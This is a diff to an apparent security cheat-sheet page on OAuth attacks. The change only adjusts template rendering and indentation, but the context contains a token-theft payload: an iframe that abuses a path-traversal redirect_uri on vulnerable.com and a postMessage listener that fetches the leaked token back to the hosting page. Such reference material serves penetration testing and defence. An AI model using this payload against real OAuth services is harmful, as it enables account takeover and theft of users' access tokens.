@@ -4,9 +4,8 @@ desc: Examples of OAuth.
 tags: [CSRF, OAuth, Web]
 alts: []
 website:
+render_with_liquid: false
 ---
-
-{% raw %}
 
 ## Change user info
 
@@ -45,10 +44,8 @@ POST /authenticate HTTP/1.1
 <!-- Proxy page (postMessage) -->
 <iframe src="https://vulnerable.com/auth?client_id=iknf...&redirect_uri=https://vulnerable.com/oauth-callback/../post/comment/comment-form&response_type=token&nonce=-118...&scope=openid%20profile%20email"></iframe>
 <script>
-	window.addEventListener('message', e => {
-	  fetch("/" + encodeURIComponent(e.data.data));
-	}, false);
+    window.addEventListener('message', e => {
+        fetch("/" + encodeURIComponent(e.data.data));
+    }, false);
 </script>
 ```
-
-{% endraw %}
